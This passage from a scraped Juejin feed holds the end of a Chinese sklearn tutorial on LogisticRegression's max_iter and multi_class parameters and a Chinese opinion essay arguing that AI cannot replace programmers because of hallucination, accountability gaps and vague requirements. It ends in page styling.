lr = LR(penalty=<span class="hljs-string">"l2"</span>, solver=<span class="hljs-string">"liblinear"</span>, C=<span class="hljs-number">0.9</span>, max_iter=<span class="hljs-number">300</span>).fit(Xtrain, Ytrain)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"Number of iterations:"</span>, lr.n_iter_)

</code></pre>
<p>当max_iter中限制的步数已经走完了，逻辑回归却还没没有找到损失函数的最小值，参数w的值还没有被收敛，sklearn就会弹出下面的警告。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ef07bd0777743498a3d083933d7a2eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873530&amp;x-signature=JJ8Lv9%2FrKWS4iJATgVdcI7KsiuE%3D" alt="sklearn max_iter 步数走完" loading="lazy"/>
虽然写法看起来不同，但是其实含义都一样，这是在提醒我们：参数没有收敛，请增大max_iter中输入的数字。
但是我们不一定要听sklearn的，max_iter很大，意味着步长小，模型运行得会更加缓慢。我们在梯度下降中追求的是损失函数的最小值，但这也可能意味着我们的模型会过拟合（在训练集上表现的太好，在测试集上不一定）。因此，如果在max_iter红条的情况下，模型的训练和预测效果都已经不错了，那我们就不需要再增大max_iter中的数目了，毕竟一切都以模型的预测效果为基准，只要模型预测的效果好，运行又快，那就一切都好。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/969a795959994b4596c1aa51afc65d5d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873530&amp;x-signature=AmlxOzF2iozILqL1cCFcLaHvn%2FU%3D" alt="liblinear 处理数据" loading="lazy"/></p>
<p>生成的图片如下图所示：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77c37483b93948fd8417f95ad96e064c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873530&amp;x-signature=VfN060FDkbAv5wwFUIgvbgIE6V8%3D" alt="liblinear 处理数据" loading="lazy"/></p>
<h3 data-id="heading-4">分类方式选参数</h3>
<p>multi_class参数决定了我们分类方式的选择，有ovr和multinomial两个值可以选择，默认是ovr。
ovr即前面提到的one-vs-rest（OvR），而multinomial即前面提到的many-vs-many（MvM）。如果是二元逻辑回归，ovr和multinomial并没有任何区别，区别主要是在多元回归逻辑上。
OvR的思想很简单，无论你是多少元回逻辑回归，我们都可以看做二元逻辑回归。具体做法是，对于第K类的分类决策，我们把所有第K类的样本作为正例，除了第K类样本以外的所有样本都作为负例，然后在上面做二元逻辑回归，得到第K类的分类模型。其他类的分类模型获得以此类推。</p>
<p>生成三个假的数据集：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a84c79a7d1c4acaaced9c2056c01dac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873530&amp;x-signature=5FnC1e4tdUfOsdc0PFOm9fyTPt8%3D" alt="分类方式选参数" loading="lazy"/></p>
<p>定义一个函数：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bcf4246cc4b843898493a2a65a438cc1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873530&amp;x-signature=Tgi%2Fc85mDYHi0E4MKCU%2FE6RG5B4%3D" alt="分类方式选参数" loading="lazy"/></p>
<p>处理过的数据集是二分类问题，通过逻辑回归可能得到黑线区分不同类别。
同理：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f7062a2bf1224385beb6d48d544281c6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873530&amp;x-signature=84z%2BfEus8%2F8IUZyet1gXF9qroSc%3D" alt="处理过的数据集是二分类问题，通过逻辑回归可能得到黑线区分不同类别" loading="lazy"/>
定义一个函数：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e1fc365c51b448ab963bf3ebc6d8f904~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873530&amp;x-signature=lB39kQ4j7G8txmW%2F3O8n8m7sBjA%3D" alt="定义二分类的函数" loading="lazy"/>
绘制的图像如下所示：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b0019137663745ceb78820ad8b15f679~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873530&amp;x-signature=lIt7haclaqcrQS5WnuztyxeTUC0%3D" alt="二分类的图像" loading="lazy"/>
定义一个函数：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/792535963c4442b78985beef164a758e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873530&amp;x-signature=nc%2BXLXLDm5lXVGOImUj2ouJ7g8U%3D" alt="二分类的函数" loading="lazy"/></p>
<p>将公式总结在一起：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35cb89f79d204b6a9239b9e9b250b620~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873530&amp;x-signature=kYIAsY56Q876kAsO7UII55LWIWk%3D" alt="二分类问题" loading="lazy"/>
处理过的数据集就是二分类问题，通过逻辑回归可能得到黑线区分不同类别。
同理，当需要预测新的数据类别时，使用如下公式：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54894ed56a594c6baaa8f628a91f562a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873530&amp;x-signature=7kZRxuZzLiWgcRFxnZRd189%2FPtc%3D" alt="处理二分类问题" loading="lazy"/>
使用不同的函数来预测输入x，分别计算不同y^的值，然后取其中的最大值。哪个类别对应的 i 越大，就认为 y^属于哪个类别。
而 MvM 则相对复杂，这里举 MvM 特例 one-vs-one（OvO）作讲解。
如果模型有 T 类，我们每次在所有的 T 类样本里面选择两类样本出来，不防记为 T1 和 T2，把所有的输出为 T1 和 T2 的样本放在一起，把 T1 作为正例，T2 作为负例，进行二元逻辑回归，得到模型参数，我们一共需要 T（T-1）/2 次分类。
从上面描述可以看出 OvR 相对简单，但分类效果相对较差（这里指大多数样本分布情况，某些样本分布下 OvR 可能更好）。而 MvM 分类相对精确，但是分类速度没有 OvR 快。
如果选择了 OvR，则 4 种损失函数的优化方法 liblinear、newton-cg、bfgs 和 sag 都可以选择。但是如果选择了multinomial。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn.linear_model <span class="hljs-keyword">import</span> LogisticRegression <span class="hljs-keyword">as</span> LR
<span class="hljs-keyword">from</span> sklearn.datasets <span class="hljs-keyword">import</span> load_iris
iris = load_iris()
<span class="hljs-keyword">for</span> multi_class <span class="hljs-keyword">in</span> (<span class="hljs-string">'multinomial'</span>, <span class="hljs-string">'ovr'</span>):
clf = LR(solver=<span class="hljs-string">'sag'</span>, max_iter=<span class="hljs-number">100</span>, random_state=<span class="hljs-number">42</span>,
multi_class=multi_class).fit(iris.data,iris.target)
<span class="hljs-comment">#打印两种multi_class模式下的训练分数</span>
<span class="hljs-comment">#%的⽤法，⽤%来代替打印的字符串中，想由变量替换的部分。%.3f表示，保留三位⼩数的浮点数。%s表示，</span>
字符串。
<span class="hljs-comment">#字符串后的%后使⽤元祖来容纳变量，字符串中有⼏个%，元组中就需要有⼏个变量</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"training score : %.3f (%s)"</span> % (clf.score(iris.data,
iris.target),multi_class))
</code></pre>
<p>执行结果如下图所示：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/611c54d6924441e7aae8cf13e6e36d72~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768873530&amp;x-signature=FXJ1YyrFnC5QWNiKEzqOBAUqiFA%3D" alt="multi_class模式下的训练分数" loading="lazy"/></p>
<h2 data-id="heading-5">错误速查</h2>





























<table><thead><tr><th>症状</th><th>根因</th><th>定位</th><th>修复</th></tr></thead><tbody><tr><td>警告：max_iter 未收敛</td><td>迭代次数不足，模型未收敛</td><td>LogisticRegression 中 max_iter 参数</td><td>增大 max_iter，同时注意平衡训练速度与过拟合</td></tr><tr><td>模型过拟合（训练集准确率高，测试集低）</td><td>迭代次数过高，模型学习过多细节</td><td>max_iter 设置过大，训练过程过于精细</td><td>调整 max_iter 至合理范围，避免过度迭代</td></tr><tr><td>分类效果不理想</td><td>multi_class 参数选择不当</td><td>LogisticRegression 中 multi_class 设置</td><td>对于多类问题，使用 multinomial 或调整 OvR 设置</td></tr></tbody></table>
<h2 data-id="heading-6">其他系列</h2>
<h3 data-id="heading-7">🚀 AI篇持续更新中（长期更新）</h3>
<p><strong>AI炼丹日志-29 - 字节跳动 DeerFlow 深度研究框<em>斜体样式</em>架 私有部署 测试上手 架构研究</strong>，持续打造实用AI工具指南！
<strong>AI研究-132 Java 生态前沿 2025：Spring、Quarkus、GraalVM、CRaC 与云原生落地</strong></p>
<h3 data-id="heading-8">💻 Java篇持续更新中（长期更新）</h3>
<p><strong>Java-218 RocketMQ Java API 实战：同步/异步 Producer 与 Pull/Push Consumer</strong>
MyBatis 已完结，Spring 已完结，Nginx已完结，Tomcat已完结，分布式服务已完结，Dubbo已完结，MySQL已完结，MongoDB已完结，Neo4j已完结，FastDFS 已完结，OSS已完结，GuavaCache已完结，EVCache已完结，RabbitMQ已完结，RocketMQ正在更新... 深入浅出助你打牢基础！</p>
<h3 data-id="heading-9">📊 大数据板块已完成多项干货更新（300篇）：</h3>
<p>包括 Hadoop、Hive、Kafka、Flink、ClickHouse、Elasticsearch 等二十余项核心组件，覆盖离线+实时数仓全栈！
<strong>大数据-278 Spark MLib - 基础介绍 机器学习算法 梯度提升树 GBDT案例 详解</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI 能替代程序员编写所有代码吗？]]></title>    <link>https://juejin.cn/post/7594383365418025006</link>    <guid>https://juejin.cn/post/7594383365418025006</guid>    <pubDate>2026-01-13T01:49:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594383365418025006" data-draft-id="7594262760941158434" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI 能替代程序员编写所有代码吗？"/> <meta itemprop="keywords" content="AI编程"/> <meta itemprop="datePublished" content="2026-01-13T01:49:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="潘锦"/> <meta itemprop="url" content="https://juejin.cn/user/730549110707431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI 能替代程序员编写所有代码吗？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/730549110707431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    潘锦
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:49:29.000Z" title="Tue Jan 13 2026 01:49:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>从 AI 出来，这个一直都会有人问，而且问得越来越多，特别是看到各种 AI 编程工具演示视频后，很多人开始焦虑程序员这个职业是不是要消失了。</p>
<p>我的答案很直接：不能，至少在可预见的未来不能。</p>
<p>这不是为了安慰程序员群体，而是基于当前 AI 技术的实际情况。我们需要理清楚 AI 在编程领域到底能做什么，不能做什么，以及为什么有些事情它做不了。</p>
<h2 data-id="heading-0">1. 幻觉</h2>
<p>AI 的幻觉问题到现在都没解决。什么是幻觉？就是 AI 会一本正经地胡说八道，编造一些看起来合理但实际上错误的内容。</p>
<p>在写代码这件事上，幻觉问题是不能接受的。AI 可能会调用一个不存在的 API，使用一个错误的参数，或者干脆编造一个听起来很合理的函数名。更麻烦的是，这些错误往往藏得很深，表面上代码结构完整，语法正确，但实际运行时就是不对。</p>
<p>以前一段时间的经历为例，生成的 Python 中有一个缩进不对，导致整个逻辑正常，代码能跑通，但是结果不对。</p>
<p>这些问题的根源在于 AI 并不真正理解代码的含义，它只是基于训练数据中的模式来生成看起来相似的内容。就像一个人背了很多数学公式，但不理解数学原理，遇到新问题就容易出错。</p>
<p>当前业界投入大量资源研究如何减少 AI 的幻觉问题，但进展缓慢。因为这不是简单的工程问题，而是涉及到 AI 模型的根本机制。在这个问题解决之前，让 AI 独立编写生产级代码是不现实的。</p>
<h2 data-id="heading-1">2. 谁来背锅</h2>
<p>在整个系统产生的过程中，说得不好听一些，作为系统的开发者，有一个点是承担责任。当系统出现 bug 导致用户损失，当安全漏洞被攻击造成数据泄露，当性能问题影响业务运营，总得有人负责，总得有人背锅吧。</p>
<p>程序员写的代码，程序员负责。团队开发的系统，团队负责。但 AI 写的代码，谁负责？</p>
<p>这不是一个技术问题，而是一个法律和伦理问题。AI 不是法律主体，不能签合同，不能承担责任，也不能被追责。如果 AI 生成的代码造成了损失，责任链条就断了。</p>
<p>有人可能会说，使用 AI 的人负责不就行了？问题是，如果一个人不懂代码，只是用 AI 生成了代码并部署上线，出了问题他怎么负责？他既看不懂代码，也无法判断代码的质量，更不知道如何修复问题。</p>
<p>这就像让一个不会开车的人用自动驾驶上路，出了事故算谁的？</p>
<p>在企业环境中，这个问题更加突出。每一行代码都可能涉及商业机密、用户隐私、合规要求。没有明确的责任主体，没有人敢让 AI 完全接管代码编写工作。</p>
<p>即使技术上 AI 能写出完美的代码（当然现在还做不到），责任问题不解决，企业也不会放心使用。这需要整个社会在法律、保险、认证等多个层面建立新的体系，这个过程可能需要很多年。</p>
<h2 data-id="heading-2">3. 很多人是讲不清需求的</h2>
<p>AI 写代码面临的另一个核心问题是需求表达。大部分人根本说不清楚自己要什么。</p>
<p>这个问题在 AI 生图领域已经很明显了。你让 AI 画一个美女，它能画。但你想要的是什么风格的美女？表情是什么？穿什么衣服？在什么场景？光线如何？构图怎样？大部分人说不出来，或者说出来的和脑子里想的不一样。</p>
<p>写代码更复杂。一个看似简单的需求，比如"做一个用户登录功能"，背后有无数细节：</p>
<ul>
<li>用什么方式登录？用户名密码？手机验证码？第三方登录？</li>
<li>密码怎么存储？用什么加密算法？</li>
<li>登录失败怎么处理？要不要限制尝试次数？</li>
<li>Session 怎么管理？Cookie 怎么设置？</li>
<li>安全怎么保证？如何防止 SQL 注入、XSS 攻击？</li>
<li>性能怎么优化？并发怎么处理？</li>
</ul>
<p>程序员的价值很大程度上在于把模糊的需求转化为精确的实现。这个过程需要大量的沟通、理解、权衡和决策。客户说"我要一个购物车"，程序员要问清楚几十个问题才能开始写代码。</p>
<p>如果需求表达不清，AI 只能猜。它可能猜对，也可能猜错。更可能的是，它会按照训练数据中最常见的模式来实现，结果是千篇一律的代码，无法满足具体的业务需求。</p>
<p>有人可能觉得，那就把需求说得详细一点。问题是，如果你能把需求说得足够详细、足够精确，你基本上已经完成了编程工作的一半。剩下的编码部分反而是相对简单的。</p>
<p>这就像写作一样。如果你能把文章的每个段落、每个句子都想清楚，那写出来就很快。难的是想清楚要写什么、怎么写。</p>
<h2 data-id="heading-3">4. 最后</h2>
<p>技术在进步，AI 也在进化。也许有一天，幻觉问题会被解决，责任体系会被建立，需求表达会变得简单。但那一天还很遥远。</p>
<p>在可预见的未来，AI 和程序员的关系更像是飞行员和自动驾驶系统的关系。自动驾驶可以处理大部分常规飞行，但起飞、降落、应急处理还是需要飞行员。飞行员的数量可能会减少，但不会消失。</p>
<p>对程序员来说，与其担心被 AI 替代，不如学会用好 AI 工具。会用 AI 的程序员和不会用 AI 的程序员，生产力差距会越来越大。</p>
<p>同时，程序员需要把更多精力放在 AI 做不了的事情上：深入理解业务、提升架构能力、加强沟通技巧、培养产品思维。这些能力不仅不会被 AI 替代，反而会因为 AI 的辅助而变得更有价值。</p>
<p>软件开发的本质是解决问题，而不是写代码。代码只是手段，解决问题才是目的。只要人类社会还有问题需要解决，程序员这个职业就会存在，只是工作方式会发生变化。</p>
<p>AI 改变的是编程的方式，不是编程的需求。就像高级语言没有消灭汇编程序员，框架没有消灭底层开发者，AI 也不会消灭程序员。它只是给了我们一个更强大的工具，让我们能够解决更复杂的问题，创造更大的价值。</p>
<p>以上。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI Agent不够聪明，但 SaaS 公司可能是解药]]></title>    <link>https://juejin.cn/post/7594310266411335680</link>    <guid>https://juejin.cn/post/7594310266411335680</guid>    <pubDate>2026-01-13T01:50:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594310266411335680" data-draft-id="7594262760941174818" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI Agent不够聪明，但 SaaS 公司可能是解药"/> <meta itemprop="keywords" content="Agent"/> <meta itemprop="datePublished" content="2026-01-13T01:50:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="潘锦"/> <meta itemprop="url" content="https://juejin.cn/user/730549110707431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI Agent不够聪明，但 SaaS 公司可能是解药
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/730549110707431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    潘锦
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:50:51.000Z" title="Tue Jan 13 2026 01:50:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul 